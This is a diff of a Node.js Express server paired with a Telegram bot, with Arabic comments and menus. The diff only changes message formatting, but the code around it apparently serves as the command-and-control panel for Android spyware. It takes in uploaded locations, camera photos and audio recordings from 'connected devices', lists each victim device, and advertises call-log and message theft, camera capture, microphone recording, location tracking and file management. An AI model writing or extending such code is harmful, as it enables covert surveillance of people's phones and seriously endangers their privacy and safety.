@@ -66,7 +66,7 @@ app.post('/uploadLocation', (req, res) => {
     res.send('');
 });
 
-// ⭐ استقبال الصور من الكاميرا
+// استقبال الصور من الكاميرا
 app.post('/uploadImage', upload.single('image'), (req, res) => {
     const model = req.headers.model || 'Unknown';
     const cameraType = req.headers.camera_type || 'Unknown';
@@ -79,7 +79,7 @@ app.post('/uploadImage', upload.single('image'), (req, res) => {
     res.send('');
 });
 
-// ⭐ استقبال التسجيلات الصوتية
+// استقبال التسجيلات الصوتية
 app.post('/uploadAudio', upload.single('audio'), (req, res) => {
     const model = req.headers.model || 'Unknown';
     const duration = req.headers.duration || 'Unknown';
@@ -244,7 +244,7 @@ function handleMainCommand(msg) {
     }
 }
 
-// ⭐⭐ معالجة Callback Queries - جميع الأوامر المؤكدة
+// معالجة Callback Queries - جميع الأوامر المؤكدة
 bot.on('callback_query', (callbackQuery) => {
     const message = callbackQuery.message;
     const data = callbackQuery.data;
@@ -405,17 +405,17 @@ function showMainMenu(text = 'اختر من القائمة:') {
 
 function showStartMenu() {
     bot.sendMessage(id,
-        `🤖 *مرحباً بك في البوت المتقدم* \\\\n\\\\n` +
-        `✅ *الميزات المتوفرة:*\\\\n` +
-        `📱 إدارة الأجهزة المتصلة\\\\n` +
-        `📞 سجل المكالمات والرسائل\\\\n` +
-        `📷 الكاميرا الأمامية والخلفية\\\\n` +
-        `🎤 تسجيل صوتي\\\\n` +
-        `📍 تتبع الموقع\\\\n` +
-        `📁 إدارة الملفات\\\\n` +
-        `\\\\n⚡ *اختر من القائمة:*`,
+        `🤖 *مرحباً بك في البوت المتقدم* \n\n` +
+        `✅ *الميزات المتوفرة:*\n` +
+        `📱 إدارة الأجهزة المتصلة\n` +
+        `📞 سجل المكالمات والرسائل\n` +
+        `📷 الكاميرا الأمامية والخلفية\n` +
+        `🎤 تسجيل صوتي\n` +
+        `📍 تتبع الموقع\n` +
+        `📁 إدارة الملفات\n` +
+        `\n⚡ *اختر من القائمة:*`,
         {
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'Markdown',
             reply_markup: {
                 keyboard: [
                     ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر']
@@ -432,18 +432,18 @@ function showConnectedDevices() {
         return;
     }
     
-    let devicesText = `📱 *الأجهزة المتصلة \\\\(${clients.size}\\\\):*\\\\n\\\\n`;
+    let devicesText = `📱 *الأجهزة المتصلة (${clients.size}):*\n\n`;
     
     clients.forEach((device, uuid) => {
         devicesText += 
-            `📱 *${device.model}*\\\\n` +
-            `🔋 ${device.battery}% \\\\| 🤖 ${device.version}\\\\n` +
-            `📶 ${device.provider} \\\\| 💡 ${device.brightness}\\\\n` +
-            `🆔 \\\\`${uuid}\\\\\\\\`\\\\n\\\\n`;
+            `📱 *${device.model}*\n` +
+            `🔋 ${device.battery}% | 🤖 ${device.version}\n` +
+            `📶 ${device.provider} | 💡 ${device.brightness}\n` +
+            `🆔 \`${uuid}\`\n\n`;
     });
     
     bot.sendMessage(id, devicesText, {
-        parse_mode: 'MarkdownV2',
+        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [[
                 { text: '🔄 تحديث', callback_data: 'refresh' },
@@ -485,11 +485,11 @@ function showDeviceCommands(message, uuid, device) {
     ];
     
     bot.editMessageText(
-        `⚙️ *أوامر الجهاز:* 📱 ${device.model}\\\\n🔋 ${device.battery}% \\\\| 🤖 ${device.version}`,
+        `⚙️ *أوامر الجهاز:* 📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
         {
             chat_id: message.chat.id,
             message_id: message.message_id,
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'Markdown',
             reply_markup: { inline_keyboard: keyboard }
         }
     );
